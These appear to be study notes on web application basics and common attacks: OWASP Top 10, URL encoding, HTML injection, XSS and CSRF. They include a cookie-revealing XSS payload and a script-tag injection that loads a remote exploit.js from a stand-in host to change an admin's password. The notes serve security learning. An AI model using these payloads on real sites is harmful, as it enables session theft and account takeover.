# Intro to Web Applications

## Web App Layout

|Category |	Description|
|:--------|:------------|
|Web Application Infrastructure 	|Describes the structure of required components, such as the database, needed for the web application to function as intended. Since the web application can be set up to run on a separate server, it is essential to know which database server it needs to access.|
|Web Application Components 	|The components that make up a web application represent all the components that the web application interacts with. These are divided into the following three areas: UI/UX, Client, and Server components.|
|Web Application Architecture 	|Architecture comprises all the relationships between the various web application components.|

Infra setups models

- Client-Server
- One Server
- Many Servers - One Database
- Many Servers - Many Databases

### OWASP Top 10

|No. 	|Vulnerability|
|:--------|:------------|
|1. |	Broken Access Control|
|2. |	Cryptographic Failures|
|3. 	|Injection|
|4. 	|Insecure Design|
|5. 	|Security Misconfiguration|
|6. 	|Vulnerable and Outdated Components|
|7. 	|Identification and Authentication Failures|
|8. 	|Software and Data Integrity Failures|
|9. 	|Security Logging and Monitoring Failures|
|10. |	Server-Side Request Forgery (SSRF)|


### URL Encoding
|Character |	Encoding|
|:--------|:------------|
|space 	|%20|
|! |	%21|
|" 	|%22|
|# 	|%23|
|$ 	|%24|
|% 	|%25|
|& 	|%26|
|' 	|%27|
|( 	|%28|
|) 	|%29|

## Sensitive Data Exposure

This is about the exposure of sensitive details like comments in the html code on a site. You can view the source code of a webpage to inspect for these or use a proxy. 

## HTML Injection
The following example is a very basic web page with a single button "Click to enter your name." When we click on the button, it prompts us to input our name and then displays our name as "Your name is ...":

If no input sanitization is in place, this is potentially an easy target for HTML Injection and Cross-Site Scripting (XSS) attacks. We take a look at the page source code and see no input sanitization in place whatsoever, as the page takes user input and directly displays it.

To test for HTML Injection, we can simply input a small snippet of HTML code as our name, and see if it is displayed as part of the page. We will test the following code, which changes the background image of the web page:

```
<style> body { background-image: url('https://academy.hackthebox.com/images/logo.svg'); } </style>
```

## XSS

XSS is very similar to HTML Injection in practice. However, XSS involves the injection of JavaScript code to perform more advanced attacks on the client-side, instead of merely injecting HTML code. There are three main types of XSS:

|Type 	|Description|
|:--------|:------------|
|Reflected XSS 	|Occurs when user input is displayed on the page after processing (e.g., search result or error message).|
|Stored XSS 	|Occurs when user input is stored in the back end database and then displayed upon retrieval (e.g., posts or comments).|
|DOM XSS| 	Occurs when user input is directly shown in the browser and is written to an HTML DOM object (e.g., vulnerable username or page title).|

We can try to inject the following DOM XSS JavaScript code as a payload, which should show us the cookie value for the current user:
```
#"><img src=/ onerror=alert(document.cookie)>
```

## CSRF

CSRF can also be leveraged to attack admins and gain access to their accounts. Admins usually have access to sensitive functions, which can sometimes be used to attack and gain control over the back-end server (depending on the functionality provided to admins within a given web application). Following this example, instead of using JavaScript code that would return the session cookie, we would load a remote .js (JavaScript) file, as follows:

```
"><script src=//www.example.com/exploit.js></script>
```

The exploit.js file would contain the malicious JavaScript code that changes the user's password. Developing the exploit.js in this case requires knowledge of this web application's password changing procedure and APIs. The attacker would need to create JavaScript code that would replicate the desired functionality and automatically carry it out (i.e., JavaScript code that changes our password for this specific web application).

## Back End Servers

A back-end server is the hardware and operating system on the back end that hosts all of the applications necessary to run the web application. It is the real system running all of the processes and carrying out all of the tasks that make up the entire web application. The back end server would fit in the Data access layer.

## Web Servers

|Code |	Description|
|:--------|:------------|
|Successful responses 	|
|200 OK |	The request has succeeded|
|Redirection messages 	|
|301 Moved Permanently 	|The URL of the requested resource has been changed permanently|
|302 Found 	|The URL of the requested resource has been changed temporarily|
|Client error responses 	|
|400 Bad Request 	|The server could not understand the request due to invalid syntax|
|401 Unauthorized 	|Unauthenticated attempt to access page|
|403 Forbidden| 	The client does not have access rights to the content|
|404 Not Found |	The server can not find the requested resource|
|405 Method Not Allowed 	|The request method is known by the server but has been disabled and cannot be used|
|408 Request Timeout 	|This response is sent on an idle connection by some servers, even without any previous |request by the client|
|Server error responses 	|
|500 Internal Server Error 	|The server has encountered a situation it doesn't know how to handle|
|502 Bad Gateway |	The server, while working as a gateway to get a response needed to handle the request, received an invalid response|
|504 Gateway Timeout| 	The server is acting as a gateway and cannot get a response in time|




